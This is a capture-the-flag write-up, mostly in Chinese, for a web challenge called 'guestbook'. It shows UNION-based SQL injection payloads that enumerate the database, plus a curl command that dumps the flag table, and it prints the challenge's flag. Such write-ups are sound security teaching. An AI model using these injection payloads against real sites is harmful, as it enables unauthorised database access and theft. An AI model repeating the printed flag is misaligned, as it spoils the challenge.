# PHM #16 Web — guestbook

| 項目 | 值 |
|:---|:---|
| 類別 | Web |
| 分數 | 40 |

## 題目

> This guestbook sucks. [sqlmap](http://sqlmap.org/) is your friend.
>
> 連結: [`/gb/`](https://ctf.hackme.quest/gb/)

## 分析

PHP 留言板, `?mod=read&id=X` 讀文章. 先確認 SQLi:

```bash
# 原文章還在
?mod=read&id=27595  → 顯示 "test" post

# 加 ' 破壞
?mod=read&id=27595' → "Sorry, no data"

# OR 1=1 → 回傳文章 (confirmed SQLi)
?mod=read&id=0 OR 1=1
```

### 探欄位數

`ORDER BY N` 到 5 開始回 "Sorry" → **4 欄**.

### UNION 列結構

```sql
# 列 schema
0 UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata
→ information_schema, performance_schema, g8

# 列 tables
0 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()
→ flag, posts, users

# 列 flag table 的欄位
0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name=0x666c6167
→ flag, id, padding0, padding1
```

### 問題: `flag` 欄位是 troll

```sql
0 UNION SELECT 1,flag,3,4 FROM flag
→ http://i.giphy.com/3o72FdPiRXBRbBLUc0.gif    (giphy 梗圖, 不是 flag)
```

### 作者把真 flag 放在**第二 row**

`flag` table 有多列. 用 `group_concat` 一次全撈:

```sql
0 UNION SELECT 1,group_concat(flag),3,4 FROM flag
→ http://i.giphy.com/..., FLAG{Y0U_KN0W_SQL_1NJECT10N!!!' or 595342>123123#}, http://i.giphy.com/...
```

真 flag 在中間, 還**藏 `' or 595342>123123#`** 的 SQLi payload 當 flag content.

## 解法

```bash
curl -s "https://ctf.hackme.quest/gb/?mod=read&id=0%20UNION%20SELECT%201,group_concat(flag),3,4%20FROM%20flag"
```

## Flag

```
FLAG{Y0U_KN0W_SQL_1NJECT10N!!!' or 595342>123123#}
```

## 感想

Classic UNION-based SQLi, 兩個小關卡:
1. **ORDER BY** 探欄位數 (這題 4)
2. **多 row** 用 `group_concat` 一次撈 (作者偷放 troll 在第一列和第三列)
